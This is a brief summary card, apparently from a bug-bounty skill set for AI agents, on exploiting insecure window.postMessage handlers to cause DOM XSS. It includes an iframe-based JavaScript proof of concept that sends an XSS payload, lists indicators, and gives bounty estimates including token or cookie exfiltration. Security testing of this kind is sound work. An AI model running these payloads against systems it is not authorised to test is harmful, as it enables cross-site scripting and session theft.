# postMessage Cross-Origin Communication — Summary Card

**Phase:** 3 | **Type:** Client-Side | **Impact:** High

## Quick Summary
Exploit `window.postMessage` handlers with broken trust boundaries: no `event.origin` check, naive origin checks, unsafe `e.data` sinks (innerHTML/eval), or senders using `targetOrigin:'*'`. Drive the handler from an attacker iframe → DOM XSS in the target origin. Client-side — use Playwright MCP, never same-origin console.

## Key Indicators
- `addEventListener('message', ...)` / `onmessage` in page or third-party widgets
- `postMessage(` calls with `'*'` as targetOrigin
- iframe/chat/oauth/widget integrations across origins
- `innerHTML`/`eval`/`document.write`/`src=`/`srcdoc=` fed from message data

## Quick Test
```js
// Attacker page — embed target and fire
const f = document.createElement('iframe');
f.src = 'https://target.com/handler-page';
document.body.appendChild(f);
f.onload = () => f.contentWindow.postMessage(
  '<img src=x onerror=alert(document.domain)>', '*');
// alert in the TARGET origin -> vulnerable handler
```

## Bounty Potential
- DOM XSS in target origin = High ($1,000-$5,000)
- Token/cookie exfiltration, in-origin phishing = higher
- Sender-side leak (`'*'`) = Medium

## Token Cost
~4,000 tokens (Worker reads full SKILL.md)
